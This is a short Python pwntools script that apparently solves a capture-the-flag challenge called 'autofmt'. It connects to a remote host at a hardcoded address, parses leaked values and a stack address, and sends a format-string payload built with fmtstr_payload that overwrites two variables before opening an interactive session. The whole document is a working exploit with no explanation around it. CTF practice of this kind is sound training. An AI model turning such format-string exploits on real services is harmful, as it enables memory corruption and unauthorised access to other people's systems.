from pwn import *
context.arch = 'amd64'
context.bits = 64
p = remote("45.122.249.68", 10015)
#p = process("./autofmt")

# Get the value of a
p.recvuntil(b"a = ")
a_value = int(p.recvline().strip())
info("value a: {0}".format(hex(a_value)))

# Get the value of b
p.recvuntil(b"b = ")
b_value = int(p.recvline().strip())
info("value b: {0}".format(hex(b_value)))

# Get the address of a 
p.recvuntil(b"a address: ")
a_address = int(p.recvline().strip(),16)
info("a address: {0}".format(hex(a_address)))

# b address
b_address = a_address - 0x8
info("b address: {0}".format(hex(b_address)))

payload = fmtstr_payload(10, {a_address : a_value, b_address : b_value}, write_size="short")
p.sendline(payload)
p.interactive()